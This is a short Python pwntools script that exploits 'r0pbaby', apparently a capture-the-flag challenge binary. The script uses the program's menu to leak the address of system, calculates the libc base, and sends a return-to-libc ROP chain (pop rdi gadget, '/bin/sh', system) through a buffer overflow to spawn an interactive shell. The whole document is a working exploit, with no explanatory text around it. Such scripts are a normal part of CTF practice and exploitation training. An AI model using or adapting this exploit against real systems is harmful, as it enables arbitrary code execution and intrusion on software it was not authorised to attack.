from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'

p = process("r0pbaby")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
bin_sh_offset = next(libc.search("/bin/sh"))
pop_rdi_gadget_offset = next(libc.search(asm("pop rdi; ret")))
system_offset = libc.symbols['system']

def get_libc_base_address():
  p.sendline("1")
  p.recvuntil(".so.6: ")
  addr = p.recvline().strip()
  return int(addr, 16)

def get_libc_func_address(func):
  p.sendline("2")
  p.recvuntil("symbol: ")
  p.sendline(func)
  p.recvuntil(": ")
  addr = p.recvline().strip()
  return int(addr, 16)

def send_payload(payload):
  p.sendline("3")
  p.sendline(str(len(payload)))
  p.send(payload)

system_addr = get_libc_func_address("system")

libc_base_addr = system_addr - system_offset

log.info("Calculated read_addr: " + str(hex(libc_base_addr + libc.symbols['read'])))
log.info("Actual read addr: " + str(hex(get_libc_func_address("read"))))

payload = "a"*8 # EBP
payload += p64(libc_base_addr + pop_rdi_gadget_offset)
payload += p64(libc_base_addr + bin_sh_offset)
payload += p64(libc_base_addr + system_offset)

send_payload(payload)

p.sendline("4")

p.interactive()